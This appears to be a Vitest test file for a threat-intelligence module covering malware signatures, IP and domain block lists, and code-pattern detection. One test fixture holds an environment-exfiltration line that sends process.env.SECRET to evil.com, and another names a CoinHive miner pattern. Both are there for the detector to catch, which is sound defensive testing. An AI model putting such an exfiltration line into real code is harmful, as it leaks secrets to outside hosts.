import { describe, it, expect, beforeEach, vi } from 'vitest';
import { createHash } from 'node:crypto';
import { ThreatIntelligence } from '../ThreatIntelligence.js';
import { createLogger } from '../../utils/logger.js';

const logger = createLogger('silent');

function createMockRedis() {
  return {
    sismember: vi.fn().mockResolvedValue(0),
    sadd: vi.fn().mockResolvedValue(1),
  };
}

describe('ThreatIntelligence', () => {
  let intel: ThreatIntelligence;
  let mockRedis: ReturnType<typeof createMockRedis>;

  beforeEach(async () => {
    mockRedis = createMockRedis();
    intel = new ThreatIntelligence(mockRedis as never, logger);
    await intel.initialize();
  });

  describe('initialize', () => {
    it('should load default signatures', () => {
      const sigs = intel.getSignatures();
      expect(sigs.length).toBeGreaterThan(0);
      expect(sigs[0].id).toBe('sig-001');
    });
  });

  describe('getSignatures', () => {
    it('should return a copy of signatures array', () => {
      const sigs1 = intel.getSignatures();
      const sigs2 = intel.getSignatures();
      expect(sigs1).not.toBe(sigs2);
      expect(sigs1).toEqual(sigs2);
    });
  });

  describe('addSignature', () => {
    it('should add a new signature', () => {
      const before = intel.getSignatures().length;
      intel.addSignature({
        id: 'sig-custom',
        name: 'CustomMalware',
        hash: 'abc123',
        pattern: '',
        severity: 'high',
        description: 'Test malware',
      });
      expect(intel.getSignatures().length).toBe(before + 1);
    });
  });

  describe('IP blacklist', () => {
    it('should report unknown IP as not bad', async () => {
      expect(await intel.isKnownBadIp('1.2.3.4')).toBe(false);
    });

    it('should report known bad IP', async () => {
      mockRedis.sismember.mockResolvedValueOnce(1);
      expect(await intel.isKnownBadIp('10.0.0.1')).toBe(true);
    });

    it('should add bad IP to Redis set', async () => {
      await intel.addBadIp('10.0.0.1');
      expect(mockRedis.sadd).toHaveBeenCalledWith('threat:bad_ips', '10.0.0.1');
    });
  });

  describe('domain blacklist', () => {
    it('should report unknown domain as not bad', async () => {
      expect(await intel.isKnownBadDomain('safe.com')).toBe(false);
    });

    it('should report known bad domain', async () => {
      mockRedis.sismember.mockResolvedValueOnce(1);
      expect(await intel.isKnownBadDomain('evil.com')).toBe(true);
    });

    it('should add bad domain to Redis set', async () => {
      await intel.addBadDomain('evil.com');
      expect(mockRedis.sadd).toHaveBeenCalledWith('threat:bad_domains', 'evil.com');
    });
  });

  describe('checkCode', () => {
    it('should detect CoinHive pattern', () => {
      const match = intel.checkCode('var x = coinhive.min.js;');
      expect(match).not.toBeNull();
      expect(match?.name).toBe('CryptoMiner-JS');
    });

    it('should detect env exfiltration pattern', () => {
      const match = intel.checkCode('fetch("http://evil.com?d=" + process.env.SECRET)');
      expect(match).not.toBeNull();
      expect(match?.name).toBe('EnvExfiltrator');
    });

    it('should return null for safe code', () => {
      expect(intel.checkCode('function hello() { return "hi"; }')).toBeNull();
    });

    it('should match by exact hash', () => {
      const code = 'malicious payload';
      const codeHash = createHash('sha256').update(code).digest('hex');

      intel.addSignature({
        id: 'sig-hash',
        name: 'KnownMalware',
        hash: codeHash,
        pattern: '',
        severity: 'critical',
        description: 'Known malware by hash',
      });

      expect(intel.checkCode(code)?.name).toBe('KnownMalware');
    });
  });
});
